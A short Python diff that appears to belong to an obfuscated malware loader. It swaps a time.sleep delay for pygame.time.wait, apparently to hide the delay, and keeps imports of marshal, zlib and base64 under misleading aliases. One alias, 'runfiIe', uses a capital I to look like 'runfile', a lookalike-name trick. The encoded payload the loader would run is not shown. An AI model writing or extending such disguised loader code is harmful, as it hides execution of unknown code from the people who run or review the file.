@@ -1,5 +1,5 @@
-import time
-time.sleep(10)
+import pygame
+pygame.time.wait(10000)
 import marshal, zlib, base64
 runfile = base64.b16decode
 runfiIe = zlib.decompress
